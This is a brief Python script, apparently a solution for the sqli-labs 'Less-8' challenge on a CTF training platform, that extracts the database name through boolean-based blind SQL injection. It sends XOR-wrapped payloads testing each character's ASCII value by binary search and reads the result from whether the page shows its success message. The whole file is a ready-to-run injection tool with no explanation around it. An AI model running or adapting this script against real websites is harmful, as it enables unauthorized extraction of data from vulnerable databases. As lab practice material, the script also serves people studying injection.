import time

import requests

# config-start
url = "http://a4209167-c9a4-4d45-87cb-192a11033459.node4.buuoj.cn/Less-8/?id="

playload1 = "1'^(ascii(substr((select(database())),{},1))>{})^1 --+"
databasename = ""

for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload = playload1.format(x, mid)
        new_url = url + playload
        r = requests.get(new_url)
        if r.text.find("You are in...........") != -1:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if mid == 32 or mid == 132:
        break
    databasename += chr(mid)
    print(databasename)
    time.sleep(1)

